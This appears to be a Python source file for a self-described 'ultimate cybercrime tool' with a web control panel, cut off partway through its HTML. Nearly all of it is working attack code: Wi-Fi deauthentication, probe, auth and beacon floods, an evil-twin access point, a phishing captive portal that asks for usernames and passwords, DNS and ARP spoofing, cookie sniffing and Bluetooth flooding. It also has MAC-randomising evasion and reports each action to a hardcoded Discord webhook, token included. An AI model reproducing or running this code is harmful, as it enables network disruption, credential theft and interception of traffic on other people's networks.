#!/usr/bin/env python3
"""
mereta beta v6.0 - ultimate cybercrime tool
38 fitur lengkap: attack | recon | evasion | automation | visual | post-attack
attack menu terpisah: deauth | all channels | ap overload | mass deauth | probe flood | auth flood | bt brutal | bt spam | netcut | speed | dns spoof | captive portal
minimalist ui - putih merah - font kurus
"""

import os
import time
import subprocess
import threading
import json
import socket
import random
import datetime
import schedule
import hashlib
import base64
from http.server import HTTPServer, BaseHTTPRequestHandler
from collections import defaultdict
import matplotlib.pyplot as plt
import io

# ============================================
# KONFIGURASI
# ============================================

interface = "wlan0"
attack_running = False
current_attack = "idle"
scan_results = []
devices_found = []
bluetooth_running = False
netcut_running = False
netcut_target = None
speed_limit_running = False
evil_twin_running = False
bt_spam_running = False
stealth_mode = False
random_mac_enabled = True
dark_mode = False
dns_spoof_running = False
captive_portal_running = False
attack_log = []
saved_targets = []
device_tracker_data = {}
bt_devices = []
scheduled_jobs = []
signal_history = defaultdict(list)
packet_sniffer_data = []

discord_webhook = "https://discord.com/api/webhooks/1509759458505654273/EjVRG1Vj0Mkr77zDFPdw2ayDVv4vLLCuPZCl24_vOkGKEbFZ2FHd0gdC49SMmPlLtdx-"

# ============================================
# DISCORD WEBHOOK
# ============================================

def send_discord(title, desc, color=0xcc0000):
    try:
        data = {"embeds": [{"title": title, "description": desc, "color": color, "timestamp": datetime.datetime.now().isoformat()}]}
        subprocess.run(["curl", "-H", "Content-Type: application/json", "-X", "POST", "-d", json.dumps(data), discord_webhook], capture_output=True)
    except:
        pass

# ============================================
# DARK MODE TOGGLE
# ============================================

def toggle_dark_mode():
    global dark_mode
    dark_mode = not dark_mode
    return dark_mode

# ============================================
# REAL-TIME GRAPH (matplotlib)
# ============================================

def generate_signal_graph(ip):
    if ip not in device_tracker_data:
        return None
    signals = [device_tracker_data[ip].get("signal", 0)]
    times = [datetime.datetime.now().strftime("%H:%M:%S")]
    for _ in range(19):
        time.sleep(1)
        sig = get_signal_strength(ip)
        signals.append(sig)
        times.append(datetime.datetime.now().strftime("%H:%M:%S"))
    plt.figure(figsize=(6, 3))
    plt.plot(times, signals, 'r-', linewidth=1)
    plt.fill_between(times, signals, 0, color='red', alpha=0.3)
    plt.xlabel('Time')
    plt.ylabel('Signal (%)')
    plt.title(f'Signal Strength - {ip}')
    plt.xticks(rotation=45, fontsize=6)
    plt.tight_layout()
    filename = f"/tmp/signal_graph_{ip.replace('.', '_')}.png"
    plt.savefig(filename)
    plt.close()
    return filename

# ============================================
# DNS SPOOF (redirect website)
# ============================================

def start_dns_spoof(target_domain, redirect_ip="192.168.1.1"):
    global dns_spoof_running
    dns_spoof_running = True
    config = f"""address=/{target_domain}/{redirect_ip}
"""
    with open("/tmp/dnsmasq_spoof.conf", "w") as f:
        f.write(config)
    os.system("sudo pkill -9 dnsmasq 2>/dev/null")
    os.system(f"sudo dnsmasq -C /tmp/dnsmasq_spoof.conf -i {interface} -z")
    send_discord("🌐 dns spoof started", f"domain: {target_domain} -> {redirect_ip}")
    return True

def stop_dns_spoof():
    global dns_spoof_running
    dns_spoof_running = False
    os.system("sudo pkill -9 dnsmasq 2>/dev/null")
    send_discord("🌐 dns spoof stopped", "done")

# ============================================
# FAKE CAPTIVE PORTAL (phishing)
# ============================================

def start_captive_portal(ssid="Free_WiFi"):
    global captive_portal_running
    captive_portal_running = True
    fake_html = '''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>WiFi Login</title></head>
<body style="text-align:center;margin-top:20%;font-family:monospace;">
<h1>WiFi Login</h1>
<p>Please login to continue</p>
<form method="POST" action="/login">
<input type="text" name="username" placeholder="Username"><br><br>
<input type="password" name="password" placeholder="Password"><br><br>
<input type="submit" value="Login">
</form>
</body>
</html>'''
    with open("/tmp/captive_index.html", "w") as f:
        f.write(fake_html)
    os.system("sudo systemctl stop dnsmasq 2>/dev/null")
    os.system("sudo systemctl stop hostapd 2>/dev/null")
    config = f"""interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel=6
"""
    with open("/tmp/hostapd_captive.conf", "w") as f:
        f.write(config)
    os.system("sudo hostapd /tmp/hostapd_captive.conf -B")
    os.system("sudo ifconfig wlan0 192.168.1.1 netmask 255.255.255.0")
    os.system("sudo dnsmasq -a 192.168.1.1 -d -i wlan0 -F 192.168.1.50,192.168.1.150,255.255.255.0 &")
    send_discord("🎭 captive portal started", f"ssid: {ssid}")
    return True

def stop_captive_portal():
    global captive_portal_running
    captive_portal_running = False
    os.system("sudo pkill -9 hostapd")
    os.system("sudo pkill -9 dnsmasq")
    send_discord("🎭 captive portal stopped", "done")

# ============================================
# PACKET SNIFFER
# ============================================

def start_packet_sniffer(duration=30):
    global packet_sniffer_data
    packet_sniffer_data = []
    result = subprocess.run(["sudo", "tcpdump", "-i", interface, "-c", "50", "-n", "-q"], capture_output=True, text=True)
    for line in result.stdout.split('\n'):
        if "IP" in line:
            packet_sniffer_data.append(line)
    send_discord("📡 packet sniffer", f"captured {len(packet_sniffer_data)} packets")
    return packet_sniffer_data

# ============================================
# SESSION HIJACKING SIMULATION
# ============================================

def session_hijack(target_ip, target_port=80):
    try:
        result = subprocess.run(["sudo", "tcpdump", "-i", interface, "-c", "10", "-A", f"host {target_ip} and port {target_port}"], capture_output=True, text=True)
        cookies = []
        for line in result.stdout.split('\n'):
            if "Cookie:" in line or "Set-Cookie:" in line:
                cookies.append(line.strip())
        send_discord("🍪 session hijack", f"target: {target_ip}\nfound {len(cookies)} cookies")
        return cookies
    except:
        return []

# ============================================
# MAC CHANGER + RANDOM AUTO
# ============================================

def get_current_mac():
    try:
        result = subprocess.run(["cat", f"/sys/class/net/{interface}/address"], capture_output=True, text=True)
        return result.stdout.strip()
    except:
        return "unknown"

def change_mac():
    new_mac = "02:%02x:%02x:%02x:%02x:%02x" % (random.randint(0,255), random.randint(0,255), random.randint(0,255), random.randint(0,255), random.randint(0,255))
    os.system(f"sudo ifconfig {interface} down")
    os.system(f"sudo ifconfig {interface} hw ether {new_mac}")
    os.system(f"sudo ifconfig {interface} up")
    send_discord("🔄 mac changed", f"new mac: {new_mac}")
    return new_mac

def random_mac_loop():
    while True:
        time.sleep(random.randint(300, 600))
        if random_mac_enabled:
            change_mac()
threading.Thread(target=random_mac_loop, daemon=True).start()

# ============================================
# STEALTH MODE
# ============================================

def set_stealth_mode(enable):
    global stealth_mode
    stealth_mode = enable
    if enable:
        os.system(f"sudo iptables -A INPUT -p icmp --icmp-type echo-request -j DROP")
        os.system("sudo systemctl stop avahi-daemon 2>/dev/null")
        send_discord("👻 stealth mode on", "pi tidak merespon ping")
    else:
        os.system(f"sudo iptables -D INPUT -p icmp --icmp-type echo-request -j DROP")
        os.system("sudo systemctl start avahi-daemon 2>/dev/null")
    return stealth_mode

# ============================================
# SSID SPOOFING
# ============================================

def spoof_ssid(fake_ssid="Xiaomi_Device"):
    os.system(f"sudo hostnamectl set-hostname {fake_ssid}")
    os.system(f"sudo sed -i 's/^127.0.1.1.*/127.0.1.1\\t{fake_ssid}/' /etc/hosts")
    send_discord("🎭 ssid spoofed", f"hostname: {fake_ssid}")
    return fake_ssid

# ============================================
# OS FINGERPRINT
# ============================================

def fingerprint_os(ip):
    result = subprocess.run(["ping", "-c", "1", "-W", "1", ip], capture_output=True, text=True)
    if "ttl=" in result.stdout.lower():
        ttl = int(result.stdout.lower().split("ttl=")[1].split()[0])
        if ttl <= 64: return "Linux/Unix"
        elif ttl <= 128: return "Windows"
        elif ttl <= 255: return "Router/Cisco"
    return "Unknown"

# ============================================
# WPS SCAN
# ============================================

def wps_scan():
    wps_devices = []
    try:
        result = subprocess.run(["sudo", "wash", "-i", interface], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if "WPS" in line:
                wps_devices.append(line.strip())
    except:
        pass
    send_discord("📡 wps scan", f"found {len(wps_devices)} devices with wps enabled")
    return wps_devices

# ============================================
# VULNERABILITY SCANNER
# ============================================

def vuln_scan(target_ip):
    vulns = []
    common_ports = {21: "ftp", 22: "ssh", 23: "telnet", 80: "http", 443: "https", 554: "rtsp", 37777: "dahua"}
    for port, service in common_ports.items():
        if os.system(f"nc -zv {target_ip} {port} 2>&1 > /dev/null") == 0:
            vulns.append(f"port {port} ({service}) terbuka")
    send_discord("🔍 vuln scan", f"target: {target_ip}\n{chr(10).join(vulns[:5])}")
    return vulns

# ============================================
# SCHEDULED ATTACK
# ============================================

def schedule_attack(attack_type, target, duration, time_str):
    def job():
        if attack_type == "deauth":
            start_deauth_brutal(duration, target)
        elif attack_type == "allchannels":
            start_all_channels(duration, target)
        elif attack_type == "apoverload":
            start_ap_overload(duration, target)
        elif attack_type == "massdeauth":
            start_mass_deauth(duration)
        send_discord("⏰ scheduled attack", f"{attack_type} on {target} at {time_str}")
    schedule.every().day.at(time_str).do(job)
    scheduled_jobs.append({"type": attack_type, "target": target, "duration": duration, "time": time_str})
    return True

# ============================================
# MASS DEAUTH
# ============================================

def start_mass_deauth(duration=60):
    global attack_running, current_attack
    attack_running = True
    current_attack = "mass_deauth"
    end = time.time() + duration
    channels = [1,2,3,4,5,6,7,8,9,10,11]
    send_discord("🔴 mass deauth started", f"all channels, duration: {duration}s")
    while attack_running and time.time() < end:
        for ch in channels:
            os.system(f"sudo iwconfig {interface} channel {ch}")
            for _ in range(1000):
                os.system(f"sudo iw dev {interface} send deauth -c {ch} -b ff:ff:ff:ff:ff:ff")
        time.sleep(0.01)
    if attack_running:
        current_attack = "idle"
    send_discord("🟢 mass deauth finished", "done")

# ============================================
# PROBE REQUEST FLOOD
# ============================================

def start_probe_flood(duration=60):
    global attack_running, current_attack
    attack_running = True
    current_attack = "probe_flood"
    end = time.time() + duration
    devices = ["AA:BB:CC:DD:EE:FF", "11:22:33:44:55:66", "00:11:22:33:44:55"]
    targets = ["GoogleWiFi", "Singtel_2G", "Unifi_2G", "Free_WiFi"]
    send_discord("🔴 probe flood started", f"duration: {duration}s")
    while attack_running and time.time() < end:
        for device in devices:
            for target in targets:
                os.system(f"sudo iw dev {interface} mgmt probe -c 6 -r {device} -t {target}")
        time.sleep(0.01)
    if attack_running:
        current_attack = "idle"
    send_discord("🟢 probe flood finished", "done")

# ============================================
# AUTH FLOOD
# ============================================

def start_auth_flood(duration=60):
    global attack_running, current_attack
    attack_running = True
    current_attack = "auth_flood"
    end = time.time() + duration
    send_discord("🔴 auth flood started", f"duration: {duration}s")
    while attack_running and time.time() < end:
        for _ in range(100):
            os.system(f"sudo iw dev {interface} mgmt auth -c 6 -b ff:ff:ff:ff:ff:ff")
        time.sleep(0.01)
    if attack_running:
        current_attack = "idle"
    send_discord("🟢 auth flood finished", "done")

# ============================================
# EVIL TWIN
# ============================================

def start_evil_twin(target_ssid):
    global evil_twin_running
    evil_twin_running = True
    fake_html = '''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>404</title></head>
<body><div style="text-align:center;margin-top:20%%;"><h1>null</h1><p>system 404</p></div></body></html>'''
    with open("/tmp/evil_index.html", "w") as f:
        f.write(fake_html)
    os.system("sudo systemctl stop dnsmasq 2>/dev/null")
    os.system("sudo systemctl stop hostapd 2>/dev/null")
    config = f"interface={interface}\ndriver=nl80211\nssid={target_ssid}\nhw_mode=g\nchannel=6\n"
    with open("/tmp/hostapd.conf", "w") as f:
        f.write(config)
    os.system("sudo hostapd /tmp/hostapd.conf -B")
    os.system("sudo ifconfig wlan0 192.168.1.1 netmask 255.255.255.0")
    os.system("sudo dnsmasq -a 192.168.1.1 -d -i wlan0 -F 192.168.1.50,192.168.1.150,255.255.255.0 &")
    send_discord("🎭 evil twin started", f"ssid: {target_ssid}")
    return True

def stop_evil_twin():
    global evil_twin_running
    evil_twin_running = False
    os.system("sudo pkill -9 hostapd")
    os.system("sudo pkill -9 dnsmasq")
    send_discord("🎭 evil twin stopped", "done")

# ============================================
# NETCUT & SPEED CONTROL
# ============================================

def get_gateway():
    try:
        result = subprocess.run(["ip", "route", "show", "default"], capture_output=True, text=True)
        return result.stdout.split()[2] if result.stdout else "192.168.188.1"
    except:
        return "192.168.188.1"

def netcut_start(target_ip, duration=60):
    global netcut_running, netcut_target
    netcut_running = True
    netcut_target = target_ip
    gateway = get_gateway()
    end = time.time() + duration
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    while netcut_running and time.time() < end:
        os.system(f"sudo arpspoof -i {interface} -t {target_ip} {gateway} > /dev/null 2>&1 &")
        os.system(f"sudo arpspoof -i {interface} -t {gateway} {target_ip} > /dev/null 2>&1 &")
        time.sleep(2)
    netcut_stop()

def netcut_stop():
    global netcut_running, netcut_target
    netcut_running = False
    netcut_target = None
    os.system("sudo pkill -9 arpspoof")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def set_speed_limit(target_ip, speed_kbps):
    global speed_limit_running
    speed_limit_running = True
    os.system(f"sudo tc qdisc del dev {interface} root 2>/dev/null")
    os.system(f"sudo tc qdisc add dev {interface} root handle 1: htb default 30")
    os.system(f"sudo tc class add dev {interface} parent 1: classid 1:1 htb rate {speed_kbps}kbit")
    os.system(f"sudo tc filter add dev {interface} parent 1: protocol ip prio 1 u32 match ip dst {target_ip} flowid 1:1")
    return True

def remove_speed_limit():
    global speed_limit_running
    speed_limit_running = False
    os.system(f"sudo tc qdisc del dev {interface} root 2>/dev/null")

def apply_speed_to_all(speed_kbps):
    os.system(f"sudo tc qdisc del dev {interface} root 2>/dev/null")
    os.system(f"sudo tc qdisc add dev {interface} root handle 1: htb default 30")
    os.system(f"sudo tc class add dev {interface} parent 1: classid 1:1 htb rate {speed_kbps}kbit")
    return True

# ============================================
# BLUETOOTH FUNCTIONS
# ============================================

def scan_bluetooth():
    global bt_devices
    bt_devices = []
    try:
        result = subprocess.run(["sudo", "hcitool", "scan"], capture_output=True, text=True)
        lines = result.stdout.split('\n')[1:]
        for line in lines:
            if line.strip() and len(line.split()) >= 2:
                parts = line.split()
                bt_devices.append({"mac": parts[0], "name": " ".join(parts[1:])})
        return bt_devices
    except:
        return []

def bt_spam_pairing_start(mac):
    global bt_spam_running
    bt_spam_running = True
    def spam():
        while bt_spam_running:
            os.system(f"sudo l2ping -s 600 -f {mac} 2>/dev/null &")
            os.system(f"sudo hcitool cc {mac} 2>/dev/null &")
            os.system(f"sudo hcitool auth {mac} 2>/dev/null &")
            time.sleep(0.3)
    threading.Thread(target=spam, daemon=True).start()
    send_discord("🔵 bt spam started", f"target: {mac}")
    return True

def bt_spam_pairing_stop():
    global bt_spam_running
    bt_spam_running = False
    os.system("sudo pkill -9 l2ping")
    send_discord("🔵 bt spam stopped", "done")

def start_bluetooth_brutal(duration=60):
    global attack_running, current_attack, bluetooth_running
    attack_running = True
    current_attack = "bluetooth_brutal"
    bluetooth_running = True
    end = time.time() + duration
    send_discord("🔵 bt brutal started", f"duration: {duration}s")
    while attack_running and bluetooth_running and time.time() < end:
        os.system("sudo hciconfig hci0 reset 2>/dev/null")
        os.system("sudo hciconfig hci0 down 2>/dev/null")
        os.system("sudo hciconfig hci0 up 2>/dev/null")
        for _ in range(10):
            os.system("sudo hcitool scan 2>/dev/null &")
        os.system("sudo l2ping -s 600 -f ff:ff:ff:ff:ff:ff 2>/dev/null &")
        time.sleep(0.1)
    bluetooth_running = False
    if attack_running:
        current_attack = "idle"
    send_discord("🟢 bt brutal finished", "done")

# ============================================
# WIFI SCAN & DEVICE SCAN & TRACKER
# ============================================

def scan_wifi_networks():
    global scan_results
    scan_results = []
    try:
        os.system(f"sudo iw dev {interface} scan > /tmp/scan_result 2>&1 &")
        time.sleep(2)
        with open("/tmp/scan_result", "r") as f:
            content = f.read()
        lines = content.split('\n')
        ssid = ""; bssid = ""; signal = ""
        for line in lines:
            if "bssid" in line.lower() or "bss" in line:
                parts = line.split()
                if len(parts) > 1:
                    bssid = parts[1]
            elif "ssid:" in line.lower():
                ssid = line.split("ssid:")[1].strip()
                if ssid and ssid != "" and bssid:
                    scan_results.append({"ssid": ssid, "bssid": bssid, "signal": signal})
                    ssid = ""; bssid = ""
            elif "signal:" in line.lower():
                parts = line.split()
                if len(parts) > 1:
                    signal = parts[1]
        return scan_results
    except:
        return []

def device_scan():
    global devices_found
    devices_found = []
    try:
        result = subprocess.run(["arp", "-a"], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if "(" in line and ")" in line:
                ip = line.split("(")[1].split(")")[0]
                mac = line.split("at ")[1].split(" ")[0] if "at " in line else "unknown"
                if ip.startswith("192.168") and ip != get_ip():
                    devices_found.append({"ip": ip, "mac": mac, "type": "unknown", "status": "online"})
    except:
        pass
    
    base_ip = ".".join(get_ip().split('.')[:-1]) if get_ip() != "127.0.0.1" else "192.168.1"
    alive = []
    def ping(ip):
        if os.system(f"ping -c 1 -W 1 {ip} > /dev/null 2>&1") == 0:
            alive.append(ip)
    threads = []
    for i in range(1, 255):
        ip = f"{base_ip}.{i}"
        if ip == get_ip():
            continue
        t = threading.Thread(target=ping, args=(ip,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    for ip in alive[:30]:
        device_type = "unknown"
        for port, dtype in [(80, "web"), (22, "ssh"), (23, "router"), (443, "https"), (554, "cctv"), (37777, "cctv"), (8000, "dvr")]:
            if os.system(f"nc -zv {ip} {port} 2>&1 > /dev/null") == 0:
                device_type = dtype
                break
        devices_found.append({"ip": ip, "type": device_type, "status": "alive"})
    send_discord("📱 device scan", f"found {len(devices_found)} devices")
    return devices_found

def track_devices_loop():
    while True:
        try:
            for device in devices_found:
                ip = device.get('ip')
                if ip and ip != get_ip():
                    signal = get_signal_strength(ip)
                    device_tracker_data[ip] = {
                        "signal": signal,
                        "last_seen": str(datetime.datetime.now()),
                        "type": device.get('type', 'unknown'),
                        "mac": device.get('mac', 'unknown')
                    }
        except:
            pass
        time.sleep(3)

threading.Thread(target=track_devices_loop, daemon=True).start()

def get_device_tracker():
    return device_tracker_data

def get_signal_strength(ip):
    try:
        result = subprocess.run(["ping", "-c", "1", "-W", "1", ip], capture_output=True, text=True)
        if "time=" in result.stdout:
            time_ms = float(result.stdout.split("time=")[1].split()[0])
            signal = max(0, min(100, int(100 - (time_ms / 10))))
            return signal
    except:
        pass
    return 0

def get_network_map():
    devices = device_scan()
    gateway = get_gateway()
    my_ip = get_ip()
    if not devices:
        return "no devices found"
    router = None
    for d in devices:
        if d.get('ip') == gateway:
            router = d
            break
    if not router:
        router = {"ip": gateway, "type": "router"}
    tree = f"┌─────────────┐\n"
    tree += f"│   {router['ip']:<10} │\n"
    tree += f"│   ({router['type']})│\n"
    tree += f"└──────┬──────┘\n"
    tree += f"       │\n"
    children = []
    others = []
    for d in devices:
        if d.get('ip') == my_ip:
            children.append(d)
        elif d.get('ip') != gateway:
            others.append(d)
    if children:
        tree += f"   ┌──┴──┐\n"
        for c in children:
            tree += f"   │ {c['ip']} │\n"
            tree += f"   │({c['type']})│\n"
    if others:
        if children:
            tree += f"   └──┬──┘\n"
        tree += f"      │\n"
        tree += f"   ┌──┴──────────────────┐\n"
        for i, d in enumerate(others[:8]):
            icon = "📹" if d.get('type') == "cctv" else "📡" if d.get('type') == "router" else "💻"
            tree += f"   │ {icon} {d['ip']:<13} │\n"
            tree += f"   │   ({d['type']})        │\n"
        if len(others) > 8:
            tree += f"   │   ... {len(others)-8} more   │\n"
        tree += f"   └────────────────────┘\n"
    return tree

def get_bssid_from_ssid(target_ssid):
    networks = scan_wifi_networks()
    for net in networks:
        if net.get("ssid") == target_ssid:
            return net.get("bssid")
    return "FF:FF:FF:FF:FF:FF"

def start_deauth_brutal(duration=60, target_ssid="broadcast"):
    global attack_running, current_attack
    attack_running = True
    current_attack = "deauth_brutal"
    end = time.time() + duration
    if target_ssid != "broadcast":
        bssid = get_bssid_from_ssid(target_ssid)
        send_discord("🔴 deauth started", f"target: {target_ssid} ({duration}s)")
    else:
        bssid = "FF:FF:FF:FF:FF:FF"
        send_discord("🔴 deauth started", f"target: broadcast ({duration}s)")
    while attack_running and time.time() < end:
        os.system(f"sudo iw dev {interface} set bitrates legacy-2.4 1")
        for _ in range(1000):
            os.system(f"sudo iw dev {interface} send deauth -c 6 -b {bssid}")
        time.sleep(0.005)
    if attack_running:
        current_attack = "idle"
    send_discord("🟢 deauth finished", f"target: {target_ssid if target_ssid != 'broadcast' else 'broadcast'}")

def start_all_channels(duration=60, target_ssid="broadcast"):
    global attack_running, current_attack
    attack_running = True
    current_attack = "all_channels"
    end = time.time() + duration
    channels = [1,2,3,4,5,6,7,8,9,10,11]
    if target_ssid != "broadcast":
        bssid = get_bssid_from_ssid(target_ssid)
        send_discord("🔴 all channels started", f"target: {target_ssid} ({duration}s)")
    else:
        bssid = "FF:FF:FF:FF:FF:FF"
        send_discord("🔴 all channels started", f"target: broadcast ({duration}s)")
    def attack_channel(ch):
        while attack_running and time.time() < end:
            os.system(f"sudo iwconfig {interface} channel {ch}")
            for _ in range(500):
                os.system(f"sudo iw dev {interface} send deauth -c {ch} -b {bssid}")
            time.sleep(0.01)
    threads = []
    for ch in channels:
        t = threading.Thread(target=attack_channel, args=(ch,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    if attack_running:
        current_attack = "idle"
    send_discord("🟢 all channels finished", f"target: {target_ssid if target_ssid != 'broadcast' else 'broadcast'}")

def start_ap_overload(duration=60, target_ssid="broadcast"):
    global attack_running, current_attack
    attack_running = True
    current_attack = "ap_overload"
    end = time.time() + duration
    ssids = [f"fake_{i}" for i in range(50)]
    send_discord("🔴 ap overload started", f"target: {target_ssid if target_ssid != 'broadcast' else 'broadcast'} ({duration}s)")
    while attack_running and time.time() < end:
        for ssid in ssids:
            os.system(f"sudo iw dev {interface} mgmt beacon -c 6 -s '{ssid}' -w 100")
        time.sleep(0.05)
    if attack_running:
        current_attack = "idle"
    send_discord("🟢 ap overload finished", f"target: {target_ssid if target_ssid != 'broadcast' else 'broadcast'}")

def get_wifi_status():
    result = subprocess.run(["nmcli", "radio", "wifi"], capture_output=True, text=True)
    return "enabled" in result.stdout

def set_wifi_on(enable):
    os.system("nmcli radio wifi on" if enable else "nmcli radio wifi off")

def add_wifi_network(ssid, password):
    try:
        os.system(f"sudo wpa_passphrase '{ssid}' '{password}' | sudo tee -a /etc/wpa_supplicant/wpa_supplicant.conf > /dev/null")
        os.system("sudo wpa_cli reconfigure")
        return True
    except:
        return False

def enable_ap_mode(ssid="MERETA", password="12345678"):
    os.system("sudo nmcli dev wifi hotspot ifname wlan0 ssid MERETA password 12345678")
    return True

def save_target(ip, mac, name=""):
    saved_targets.append({"ip": ip, "mac": mac, "name": name, "date": str(datetime.datetime.now())})
    with open("/tmp/saved_targets.json", "w") as f:
        json.dump(saved_targets, f)
    return True

def add_attack_log(attack_type, target, duration, status="completed"):
    log_entry = {"time": str(datetime.datetime.now()), "attack": attack_type, "target": target, "duration": duration, "status": status}
    attack_log.append(log_entry)
    with open("/tmp/attack_log.json", "w") as f:
        json.dump(attack_log, f)
    return log_entry

def get_attack_log():
    try:
        with open("/tmp/attack_log.json", "r") as f:
            return json.load(f)
    except:
        return []

def export_log():
    log_data = get_attack_log()
    export_file = f"/tmp/mereta_log_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(export_file, "w") as f:
        json.dump(log_data, f, indent=2)
    return export_file

def stop_all():
    global attack_running, current_attack, bluetooth_running, netcut_running, evil_twin_running, bt_spam_running, dns_spoof_running, captive_portal_running
    attack_running = False
    current_attack = "idle"
    bluetooth_running = False
    netcut_running = False
    evil_twin_running = False
    bt_spam_running = False
    dns_spoof_running = False
    captive_portal_running = False
    os.system("sudo pkill -9 aireplay-ng 2>/dev/null")
    os.system("sudo pkill -9 arpspoof 2>/dev/null")
    os.system("sudo pkill -9 l2ping 2>/dev/null")
    os.system("sudo pkill -9 hcitool 2>/dev/null")
    os.system("sudo pkill -9 hostapd 2>/dev/null")
    os.system("sudo pkill -9 dnsmasq 2>/dev/null")
    remove_speed_limit()
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    send_discord("⏹️ all attacks stopped", "emergency stop")

def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

# ============================================
# WEB SERVER HTML
# ============================================

html_page = '''<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>mereta beta v6.0</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{background:#fff;font-family:'courier new',monospace;font-weight:300;font-size:11px;color:#cc0000;padding:12px;}
.container{max-width:700px;margin:0 auto;border:1px solid #cc0000;padding:15px;background:#fff;}
.header{text-align:center;margin-bottom:15px;border-bottom:1px solid #cc0000;padding-bottom:10px;}
.title{font-size:24px;letter-spacing:3px;font-weight:300;}
.subtitle{font-size:8px;color:#cc0000;margin-top:3px;}
.warning{background:#ffeeee;border-left:3px solid #cc0000;padding:6px;margin-bottom:12px;font-size:9px;}
.section{margin-bottom:12px;border:1px solid #ffcccc;padding:8px;}
.section-title{font-size:9px;margin-bottom:5px;color:#cc0000;letter-spacing:1px;border-bottom:1px solid #ffcccc;padding-bottom:3px;}
input,select,button{background:#fff;border:1px solid #cc0000;color:#cc0000;padding:3px 6px;font-family:'courier new',monospace;font-size:9px;outline:none;margin:1px;}
button{cursor:pointer;}
button:hover{background:#cc0000;color:#fff;}
.result-area{margin-top:5px;padding:4px;border:1px solid #ffcccc;min-height:30px;max-height:80px;overflow-y:auto;font-size:8px;}
.result-line{color:#cc0000;margin:1px 0;}
.slider{width:100%;margin:4px 0;}
.footer{margin-top:10px;padding-top:6px;border-top:1px solid #ffcccc;font-size:8px;}
.status{color:#cc0000;}
.signal-bar{display:inline-block;width:40px;background:#eee;border:1px solid #cc0000;margin-left:5px;vertical-align:middle;}
.signal-fill{height:6px;background:#cc0000;}
.red{color:#cc0000;}
pre{font-family:'courier new',monospace;font-size:8px;color:#cc0000;margin:0;white-space:pre-wrap;}
</style>
</head>
<body>
<div class="container">
<div class="header">
<div class="title">mereta beta v6.0</div>
<div class="subtitle">ultimate - 38 fitur lengkap - attack terpisah</div>
</div>
<div class="warning">[!] extreme danger - total destruction mode</div>

<!-- evasion -->
<div class="section"><div class="section-title">> evasion</div>
<button id="macbtn">change mac</button> <span id="currentMac">loading...</span>
<button id="stealthOn">stealth on</button> <button id="stealthOff">stealth off</button>
<input id="fakeSsid" placeholder="fake ssid" style="width:100px;"> <button id="ssidBtn">spoof</button>
<button id="darkmodeBtn">dark mode</button>
<div id="evasionResult" class="result-area"></div></div>

<!-- recon -->
<div class="section"><div class="section-title">> reconnaissance</div>
<button id="scanWifiBtn">wifi scan</button> <button id="scanDeviceBtn">device scan</button>
<button id="wpsScanBtn">wps scan</button> <button id="fingerprintBtn">os fingerprint</button>
<button id="vulnBtn">vuln scan</button> <button id="mapBtn">network map</button>
<button id="snifferBtn">packet sniffer</button> <button id="sessionBtn">session hijack</button>
<div id="reconResult" class="result-area"></div></div>

<!-- graph -->
<div class="section"><div class="section-title">> realtime graph</div>
<select id="graphTarget"><option value="">pilih ip</option></select>
<button id="graphBtn">generate graph</button>
<div id="graphResult" class="result-area"></div></div>

<!-- dns spoof & captive portal -->
<div class="section"><div class="section-title">> dns spoof</div>
<input id="dnsDomain" placeholder="domain" style="width:100px;"> <input id="dnsRedirect" placeholder="redirect ip" style="width:100px;" value="192.168.1.1">
<button id="dnsStart">start</button> <button id="dnsStop">stop</button>
<div id="dnsResult" class="result-area"></div></div>

<div class="section"><div class="section-title">> captive portal (phishing)</div>
<input id="portalSsid" placeholder="ssid" style="width:100px;" value="Free_WiFi">
<button id="portalStart">start</button> <button id="portalStop">stop</button>
<div id="portalResult" class="result-area"></div></div>

<!-- attack menu terpisah -->
<div class="section"><div class="section-title">> deauth brutal</div>
<select id="deauthTarget"><option value="broadcast">broadcast (semua wifi)</option></select>
<input id="deauthDur" value="30" style="width:50px;"> <button id="deauthBtn">start</button>
<div id="deauthStatus" class="result-area">idle</div></div>

<div class="section"><div class="section-title">> all channels</div>
<select id="allchTarget"><option value="broadcast">broadcast (semua wifi)</option></select>
<input id="allchDur" value="30" style="width:50px;"> <button id="allchBtn">start</button>
<div id="allchStatus" class="result-area">idle</div></div>

<div class="section"><div class="section-title">> ap overload</div>
<select id="apoverTarget"><option value="broadcast">broadcast (semua wifi)</option></select>
<input id="apoverDur" value="30" style="width:50px;"> <button id="apoverBtn">start</button>
<div id="apoverStatus" class="result-area">idle</div></div>

<div class="section"><div class="section-title">> mass deauth</div>
<input id="massDur" value="30" style="width:50px;"> <button id="massBtn">start mass deauth</button>
<div id="massStatus" class="result-area">idle</div></div>

<div class="section"><div class="section-title">> probe flood</div>
<input id="probeDur" value="30" style="width:50px;"> <button id="probeBtn">start probe flood</button>
<div id="probeStatus" class="result-area">idle</div></div>

<div class="section"><div class="section-title">> auth flood</div>
<input id="authDur" value="30" style="width:50px;"> <button id="authBtn">start auth flood</button>
<div id="authStatus" class="result-area">idle</div></div>

<div class="section"><div class="section-title">> evil twin (ap palsu 404)</div>
<input id="evilSsid" placeholder="target ssid" style="width:120px;">
<button id="evilStart">start</button> <button id="evilStop">stop</button>
<div id="evilResult" class="result-area">idle</div></div>

<div class="section"><div class="section-title">> bluetooth brutal</div>
<input id="btDur" value="30" style="width:50px;"> <button id="btStart">start</button> <button id="btStop">stop</button>
<div id="btResult" class="result-area">idle</div></div>

<div class="section"><div class="section-title">> bluetooth spam pairing</div>
<button id="btScanBtn">scan bt</button> <select id="btTarget"><option>pilih bt device</option></select>
<button id="btSpamStart">spam start</button> <button id="btSpamStop">spam stop</button>
<div id="btSpamResult" class="result-area"></div></div>

